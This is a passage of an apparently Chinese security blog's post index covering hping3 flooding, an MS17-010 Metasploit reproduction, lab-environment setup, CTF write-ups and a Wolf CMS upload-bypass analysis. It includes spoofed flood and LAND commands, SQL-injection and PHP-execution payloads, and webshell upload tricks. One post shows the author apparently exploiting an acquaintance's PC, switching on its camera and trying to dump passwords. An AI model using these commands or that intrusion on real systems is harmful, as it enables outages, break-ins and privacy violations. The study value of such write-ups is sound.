攻击hping3 –udp -s 6666 -p 53 -a 8.8.8.8 –flood 192.168.100.1LAND攻击hping3 -n -S -p 80 -a 192.168.100.1 –flood 192.168.100.1hping原理、安装、使用详解介绍hping3命令 | hping3","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://mochazz.github.io/categories/渗透测试/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://mochazz.github.io/tags/工具使用/"}]},{"title":"MS17-010复现","slug":"ms17-010","date":"2017-07-15T14:00:00.000Z","updated":"2017-09-07T01:27:20.176Z","comments":true,"path":"2017/07/15/ms17-010/","link":"","permalink":"https://mochazz.github.io/2017/07/15/ms17-010/","excerpt":"","text":"MS17-010具体点这里，以下是复现过程。使用netdiscover扫描内网存活主机：使用nmap扫描其开放端口：使用msfconsole打开msf：使用search命令搜索与ms17-010有关的利用模块：如果不了解某个模块的作用，可以先use 模块名，然后使用show info:我们先使用auxiliary/scanner/smb/smb_ms17_010模块验证漏洞是否存在：既然漏洞存在且可以利用，那么我们使用模块进行攻击：exploit攻击，成功返回shell：我们来看一下当前的用户权限：在system权限下我们可以干很多事情，比如说开摄像头：大概知道我要拍照，特意摆了一个poss～～我们来看一下系统信息：我们来读取一下他的密码：尴尬，密码不知为何显示为空:既然这样我们换一种方法，上传wce64.exe伪装成wifi.exe:使用wifi.exe -w读取明文密码：还是不能获取密码。算了，不玩了。后来第二天我把这漏洞告诉那小哥哥，并让他赶紧去打补丁，顺便问了下，原来他没设密码。","categories":[{"name":"系统安全","slug":"系统安全","permalink":"https://mochazz.github.io/categories/系统安全/"}],"tags":[{"name":"ms17-010","slug":"ms17-010","permalink":"https://mochazz.github.io/tags/ms17-010/"}]},{"title":"漏洞环境搭建之Windows+IIS6.0+SqlServer+ASP","slug":"IIS","date":"2017-07-14T14:00:00.000Z","updated":"2017-09-07T01:27:06.621Z","comments":true,"path":"2017/07/14/IIS/","link":"","permalink":"https://mochazz.github.io/2017/07/14/IIS/","excerpt":"","text":"环境准备Windows2003SQLEXPR_CHS.exe(2005)SQLServer2005_SSMSEE.msiFramewoek3.5asp_cms带有原有数据库文件(Fei.bak) 安装好的windows2003系统这是新安装好的一个windows2003系统： 安装IIS选中“应用程序服务器(IIS,ASP.NET)”，单击“下一步”：在virtualbox菜单栏上选择设备-&gt;分配光驱-&gt;选中windows2003的iso文件：点击确定，即开始安装。安装完成如下： 安装Framework3.5很好安装，一直下一步即可： 安装sqlserver2005 安装sqlserver2005管理工具一直下一步就好 建设网站右键网站-&gt;新建-&gt;网站：下一步，随便写个对于网站的描述：使用默认设置：选择网站的根目录：给访问用户读取权限即可：添加主页名称：执行权限选择纯脚本，并开启父路径：最后应用确定即可： 还原数据库成功还原后如下： 其他配置修改网站连接数据库的配置文件：打开浏览器访问，出现如下问题：这是因为我们没有给Internet来宾账户相应的权限，解决方法如下：找到网站根目录，右键属性-&gt;安全如果没有Internet来宾账户，添加即可：选择添加-&gt;高级-&gt;立即查找-&gt;选中IUSER-**-&gt;确定即可添加后给以下权限即可：如果能成功登录后台，说明我们的数据库和网站已经关联在一起了：","categories":[{"name":"Windows","slug":"Windows","permalink":"https://mochazz.github.io/categories/Windows/"}],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"https://mochazz.github.io/tags/环境搭建/"}]},{"title":"漏洞环境搭建之Linux+Apache+Mysql+PHP","slug":"LAMP","date":"2017-07-13T14:00:00.000Z","updated":"2017-09-07T01:26:43.214Z","comments":true,"path":"2017/07/13/LAMP/","link":"","permalink":"https://mochazz.github.io/2017/07/13/LAMP/","excerpt":"","text":"环境准备Ubuntu16.04apache2MySQLPHP5.6php_cms带有原有数据库文件 安装apache2先更新一下源1apt-get update 安装apache21apt-get install apache2 -y 查看apache是否安装好,下图表示安装成功： 安装MySQL安装MySQL1apt-get install mysql-server -y 设置密码:再次输入密码确认：查看MYSQL是否安装好,下图表示安装成功： 安装php5.6这个可要好好说说了，因为这个地方卡了很久。Ubuntu16.04使用apt-get install php命令默认安装的是php7.0，版本太高，对我们网站的源码支持不太好，因为高版本可能弃用某些低版本的函数或者某些函数使用方法发生变化。解决方法：添加带有php5.5的源：1234567apt-get install -y language-pack-en-baseLC_ALL=en_US.UTF-8 add-apt-repository ppa:ondrej/phpadd-apt-repository ppa:ondrej/phpapt-get updateapt-cache search php5apt-get install php5.6-common -yapt-get install libapache2-mod-php5.6 -y 接下来我们需要安装php5.6以及一些php的扩展插件：1apt-get install php5.6 php5.6-cgi php5.6-cli php5.6-phpdbg php5.6-fpm php5.6-dev php5.6-common php5.6-curl php5.6-gd php5.6-imap php5.6-intl php5.6-ldap php5.6-mysql php5.6-pspell php5.6-recode php5.6-snmp php5.6-sqlite3 php5.6-sybase php5.6-tidy php5.6-opcache php5.6-json php5.6-bz2 php5.6-mcrypt php5.6-odbc php5.6-readline php5.6-interbase php5.6-xmlrpc php5.6-enchant php5.6-gmp php5.6-xsl php5.6-bcmath php5.6-mbstring php5.6-soap php5.6-xml php5.6-dba 安装好后，我们将php_cms源码放到/var/www/html目录下：给予html文件夹和php_cms的attachment文件夹777权限：重启apache服务：浏览器访问我们的网站，发现显示拒绝连接数据库：这是因为我们之前设置了MySQL密码，所以我们需要修改php_cms的配置文件，配置文件在/var/www/html/include/database.inc.php：我们还需在新装的MySQL中创建一个数据库名为cms(上图连接数据库配置文件中数据库名为cms)，并将install.sql数据导入cms库中：此时再次打开浏览器，可以看到网站成功搭建起来：","categories":[{"name":"Linux","slug":"Linux","permalink":"https://mochazz.github.io/categories/Linux/"}],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"https://mochazz.github.io/tags/环境搭建/"}]},{"title":"2017全国信息安全竞赛 WriteUp","slug":"2017ncstisc","date":"2017-07-10T14:00:00.000Z","updated":"2017-09-07T01:07:26.501Z","comments":true,"path":"2017/07/10/2017ncstisc/","link":"","permalink":"https://mochazz.github.io/2017/07/10/2017ncstisc/","excerpt":"","text":"Misc题目签到题(√)做个问卷，全答对就给flag了。 传感器1(√)比赛时纯手动替换：这是赛后自己写的脚本：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding:utf-8__author__ = &apos;Mochazz&apos;encode = &apos;差分曼彻斯特编码&apos;dic = &#123; &apos;0&apos;:&apos;0000&apos;, &apos;1&apos;:&apos;0001&apos;, &apos;2&apos;:&apos;0010&apos;, &apos;3&apos;:&apos;0011&apos;, &apos;4&apos;:&apos;0100&apos;, &apos;5&apos;:&apos;0101&apos;, &apos;6&apos;:&apos;0110&apos;, &apos;7&apos;:&apos;0111&apos;, &apos;8&apos;:&apos;1000&apos;, &apos;9&apos;:&apos;1001&apos;, &apos;A&apos;:&apos;1010&apos;, &apos;B&apos;:&apos;1011&apos;, &apos;C&apos;:&apos;1100&apos;, &apos;D&apos;:&apos;1101&apos;, &apos;E&apos;:&apos;1110&apos;, &apos;F&apos;:&apos;1111&apos;, &#125;string1 = &apos;3EAAAAA56A69AA55A95995A569AA95565556&apos;;//题目# string1 = &apos;3EAAAAA56A69AA556A965A5999596AA95656&apos;//所求list1 = []for i in string1: list1.append(dic[i])list1 = (&apos;&apos;).join(list1)print(&apos;%s每位数字转成二进制:&apos;%string1)print(list1)l = []flag = list1[:2]if flag == &apos;00&apos; or flag == &apos;11&apos;: l.append(&apos;0&apos;)else: l.append(&apos;1&apos;)i = 2while i &lt; len(list1): if list1[i-2:i] == list1[i:i+2]: l.append(&apos;0&apos;) else: l.append(&apos;1&apos;) i += 2l = (&apos;&apos;).join(l)print(&apos;转换结果：&apos;)print(l)dic2 = &#123;value:key for key,value in dic.items()&#125;i = 0flag = []while i &lt; len(l): flag.append(dic2[l[i:i+4]]) i += 4flag = (&apos;&apos;.join(flag))print(&apos;turn to hex&apos;)print(&apos;0x&apos;+flag)print(&apos;The ID is:&apos;)print(&apos;0x&apos;+flag[6:14]) 其实这个脚本写得不好，因为太啰嗦了。16进制转2进制完全可以用python的binascii模块完成。之所以用字典来转换，是因为我还不熟悉binascii模块的用法，待改进。 warmup按照提示下载下来即可： BadHacker下下来是一个数据流量包 传感器2 embarrass(√)下载下来是一个数据包使用wireshark打开，追踪里面的FTP数据，发现数据量很大，使用NetworkMiner.exe打开这个数据包，将其中的数据分离出来(NetworkMiner.exe无法打开pcapng格式文件，需要将pcapng文件另存为pcap格式文件即可打开)：分析分离出的misc2.pcapng文件，使用ctrl+F搜索flag：选择追踪TCP流，再次搜索flag即可搜到： pyHAHA下载下来是一个.pyc结尾的文件，打开发现字符串是倒的：编写python脚本将整个文件倒过来存储，脚本如下：1234f = open(&apos;Py.py&apos;,&apos;wb&apos;)with open(&apos;PyHaHa.pyc&apos;,&apos;rb&apos;) as g: f.write(g.read()[::-1])f.close() 发现结尾给了两个flag，还隐藏了一个压缩文件：解压出来是一个mp3文件：猜测是用MP3Stego加了密，所以我们就需要找出加密用的key。然后就是找不到key，官方也不给hint。。。 调查问卷(√)签退题，随便填就给flag WebPHP execise(√)这题考察远程代码执行，payload如下：eval(‘show_source(“index.php”);’);这条语句执行后会显示出index.php的源码。PS：直接使用show_source(“index.php”);也行源码如下：12345678&lt;?php if(isset($_REQUEST[&apos;code&apos;]))&#123; $code = &quot;&lt;?php &quot;. $_REQUEST[&apos;code&apos;] . &quot;?&gt;&quot;; file_put_contents(&quot;tmp.php&quot;,$code); echo &quot;OUTCOME: \\n&quot;; include &quot;tmp.php&quot;; &#125;?&gt; file_put_contents()函数：用法：file_put_contents(文件名，字符串)功能：会将整个文件原有的内容删掉，然将第二个参数的值作为内容写入文件中。现在我们要做的就是找到flag所在位置，然后使用show_source()函数将flag内容显示出来即可。输出当前网页所在路径：列出该路径下所有文件：显示flag文件内容提交即可： wanna to see your hat?(√)考察svn源码泄露、代码审计、sql注入waf函数过滤post方式接收的name参数:12345678function waf($value)&#123; $Filt = &quot;\\bUNION.+SELECT\\b|SELECT.+?FROM&quot;; if (preg_match(&quot;/&quot;.$Filt.&quot;/is&quot;,$value)==1)&#123; die(&quot;found a hacker&quot;); &#125; $value = str_replace(&quot; &quot;,&quot;&quot;,$value); return $value;&#125; 使用Payload:or/**/1=1#’登录，直接取得flag，源码还需研究研究。 flag vending machine一个可以买flag的魔法商城，然后你的现金低于flag的标价。可能考查的是条件竞争。 Guestbook 方舟计划 CryptoClassical Partial Mailbox Reverse填数游戏(√)逆向大佬做的，将绿色部分替换成0，提交这组数字即是flag apk crack 欢迎来到加基森 溯源 ReverseBabyDriver NotFormat easyheap","categories":[{"name":"CTF竞赛训练","slug":"CTF竞赛训练","permalink":"https://mochazz.github.io/categories/CTF竞赛训练/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://mochazz.github.io/tags/CTF/"}]},{"title":"wolf cms上传漏洞分析","slug":"wolf_cms","date":"2017-07-06T14:00:00.000Z","updated":"2017-09-07T01:05:13.941Z","comments":true,"path":"2017/07/06/wolf_cms/","link":"","permalink":"https://mochazz.github.io/2017/07/06/wolf_cms/","excerpt":"","text":"最近看Freebuf上的wolf CMS任意上传漏洞分析，今天有空就复现下，在此做个记录总结 环境准备打开MySQL，创建一个数据库，库名叫wolf：将下载好的wolf cms放在wamp的www目录下:打开浏览器访问127.0.0.1，配置如下，点击continue to install：Wamp中MySQL的默认账号：root，密码为空。直接点击install now：记住下面的登录账号密码，待会要用到。这个密码是随机产生的：成功登录后台： 漏洞分析这些准备操作就绪后，我们来分析一下存在安全问题的php函数。该函数位于C:\\wamp\\www\\wolf\\plugins\\file_manager\\FileManagerController.php。我们找到问题函数upload()： $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); $ext_arr = array(&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;inc&apos;); if (in_array($ext, $ext_arr)) { Flash::set(&apos;error&apos;, __(&apos;Not allowed to upload files with extension :ext&apos;, $ext)); redirect(get_url(&apos;plugin/file_manager/browse/&apos;)); } 用\\$ext存储上传文件的后缀名，如果后缀名在\\$ext_arr数组组中，则输出错误警告，并将url重定向到plugin/file_manager/browse/。这就是典型地采用了黑名单机制，这也是问题所在。只要我们绕过了检查，即后缀名不在该数组中即可。更具体的代码分析点这里 漏洞利用过程我们上传一个cmd.php.ppp这个ppp可以是任意的后缀，只要服务器无法识别就行。由于服务器无法识别ppp这个后缀名，他就会从左往右按顺序识别，即找到php，发现可以识别，于是就将cmd.php.ppp按照php文件来解析，这就导致我们的webshell可以在服务器端成功执行。使用菜刀连接http://localhost/public/cmd.php.ppp下面是我们成功拿到服务器的截图：除了可以绕过黑名单，我们还可以直接利用编辑文件的功能，将我们的webshell直接写入服务器，过程如下：写入一句话，并保存：使用菜刀连接：使用“.phtml”(或者“php.”)为后缀命名文件，也可以绕过。 漏洞总结在编写服务器端代码时，切不可相信来自用户的任何输入、文件，都要对其进行严格检查。采用黑名单机制只可暂时防止部分恶意输入，总是有能被绕过，应该采取白名单代替。该版本cms允许用户通过后台直接创建、编辑文件，但是未对用户输入的内容进行安全验证，这也导致了攻击者可以上传webshell。","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://mochazz.github.io/categories/Web安全/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://mochazz.github.io/tags/文件上传/"}]},{"title":"HappyCTF WriteUp","slug":"happyctf","date":"2017-07-04T14:00:00.000Z","updated":"2017-09-07T01:03:05.670Z","comments":true,"path":"2017/07/04/happyctf/","link":"","permalink":"https://mochazz.github.io/2017/07/04/happyctf/","excerpt":"","text":"刚刚搭建好的博客，第一篇就拿来写WP吧。正好熟悉一下MarkDown的语法。闲话不多说，进入正题。 Web题目成绩虽然不是很好，还是放张图纪念一下。 签到题给了一个网址，发现访问不了，扫描端口，发现8888端口开放，使用：curl -I 9.9.9.9:8888windows使用VPN连接后使用nmap遇到的问题： 你不是蜘蛛打开题目链接，显示“你不是蜘蛛”，访问robots.txt，在访问其中的文件路径即可得到flag 管理员的愤怒打开题目链接，显示成功连接数据库，查看robo.txt再访问dbadmin获取phpmyadmin账号密码将获取的账号密码登录phpmyadmin即可获得flag 无权查看打开题目链接，显示forbidden！查看源代码发现index.php.bak访问获得源代码构造user和password参数 情报在哪里题目是一个阿童木爱好者站使用awvs扫描得到download.php题目又提示目标文件名为passwd，所以构造参数将文件下载下来使用strings passwd查看，并将最后那串base64解码即得flag upload题目就是让我们上传一个一句话木马上去，当然只允许图片格式文件上传设置代理，将我们的木马命名成1.gif上传，用Burpsuite抓包，将文件后缀改成1.php即可得到flag mail一开始是这么想的：只要字符串captcha的md5值前4位等于da8e，domain填上邮箱即可获得flag。但是刷新后，等号后面就不是da8e了，而且每刷新一次，就更换一次。没思路，等看完大佬们的WP再更新 未上线的聊天室没思路。。。 刮刮乐题目：在flag区右键审查元素，然后一直刷新界面，发现canvas偶尔会变一次，在变的那次刮开即可得到flag 魔法商城这题考察逻辑漏洞 包罗万象可以上传文件，还限制了文件类型，可以上传zip所以我们将一句话木马压缩成zip上传得到返回路径把url改成9.9.9.22/index.php?url=zip://文件地址，使用菜刀连接即可得到flag Register123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpsession_start();require('config.php');foreach($_POST as $key =&gt; $value)&#123; $$key = (trim((string)$value) != '')?trim((string)$value):null;&#125;$conn = mysql_connect($server,$dbusr,$dbpwd);if($conn === false)&#123; die('Connect Failed.');&#125;mysql_select_db($dbname);if(isset($_SESSION['uid']))&#123; $token = getToken($_SESSION['uid']); echo \"Your token is &#123;$token&#125;&lt;br&gt;\\n\"; &#125;elseif(isset($customid) &amp;&amp; isset($password))&#123; if(strlen($customid) &lt; 6 || strlen($password) &lt; 6 || strlen($customid) &gt; 11 || strlen($password) &gt; 30)&#123; die('1:Error.'); &#125; if(!is_numeric($customid))&#123; die('2:Error.'); &#125; register($customid, $password); $_SESSION['uid'] = getuid($customid); header('location: ./index.php?'.time());&#125;else&#123; echo &lt;&lt;&lt;EOD&lt;form action=\"index.php\" method=\"post\"&gt; CustomID: &lt;input type=\"text\" name=\"customid\" maxlength=\"11\"&gt;&lt;br&gt; Password: &lt;input type=\"password\" name=\"password\" maxlength=\"30\"&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"register\"&gt;&lt;br&gt;&lt;/form&gt;EOD;&#125;mysql_close($conn);function register($customid, $password)&#123; $password = md5($password); $token = md5(mt_rand()); mysql_query(\"insert into z_users(`customid`, `password`) values('&#123;$customid&#125;','&#123;$password&#125;')\"); $result = mysql_query(\"SELECT LAST_INSERT_ID()\"); $rows=mysql_fetch_row($result); $uid = $rows[0]; mysql_query(\"insert into z_extra(`uid`, `data`) values('&#123;$uid&#125;','&#123;$token&#125;')\");&#125;function getuid($customid)&#123; $result = mysql_query(\"select * from z_users where customid = '&#123;$customid&#125;' order by id desc\"); if($result)&#123; $row = mysql_fetch_array($result); return $row['id']; &#125; return 0;&#125;function getToken($id)&#123; $result = mysql_query(\"SELECT data from z_extra where uid = &#123;$id&#125;\"); $rows = mysql_fetch_row($result); return $rows[0];&#125;echo \"&lt;h4&gt;Source: &lt;/h4&gt;\";show_source(__FILE__);?&gt; Web312345678910111213&lt;?phpini_set('session.serialize_handler', 'php');require(\"./class.php\");session_start();$obj = new foo1();$obj-&gt;varr = \"phpinfo.php\";?&gt; 这是foo1的析构函数 我的博客title简直误导我。。。该网站存在文件包含漏洞查看源码获得flag： 新闻网站没做出来 绕过看门狗题目和上一题一样，多了安全狗。通过大小写绕过关键字即可得到flag，由于比赛时手工注入，未截图 Be allowed?用Burpsuite抓包，添加X-Forwarded-For: localhost然后就不会了。。。 admin123456过滤任何字符，小写字母自动转换成大写字母网页源代码如下 第三个空白页查看源代码：访问http://9.9.9.32/?way=AHAHAH，出现如下页面：使用Burpsuite抓包，添加X-Forwarded-For: 127.0.0.1即可获得flag 运维失误 古老的留言板 2048 jshunt这题很懵逼，无缘无故拿了一血，之后整场比赛没人做出来(有bug) iphone6使用chrome，按F12选择iPhone6刷新页面，查看即可 又是空白页 misc、crypto题目这是什么下载下来是一个apk，本来以为是安卓逆向的，结果并不是明显jsfuck，复制到控制台运行即可： 粽子的来历题目给了四个损坏的压缩文件用winhex打开发现有奇怪之处将其全改成FF，可得到一首诗，他们的行间距不一样将行距大的设为1，小的设为0，即可得到100100100010，其md5即是flag 大白图片感觉像是被截取了一半，查看属性：高度256对应16进制为100，使用winhex打开图片，找到100改成200即可看到flag： rar使用Advanced RAR Password Recovery破解即可： ningen使Ziperello破解即可： 萌萌哒的八戒猪圈密码： 文件中的秘密这题源图片不见了，截别人的wp来用： 隐藏的钥匙题目是一张图片，使用记事本打开搜索flag，然后base64解密即可得到flag 题目忘了下载下来是一个不正常的图片，使用strings 这是什么.jpg查看将最后两行的HTML编码保存在文本编辑器中，并保存为flag.html，打开即可：=========================== 未完，待更新 ===============================","categories":[{"name":"CTF竞赛训练","slug":"CTF竞赛训练","permalink":"https://mochazz.github.io/categories/CTF竞赛训练/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://mochazz.github.io/tags/CTF/"}]}]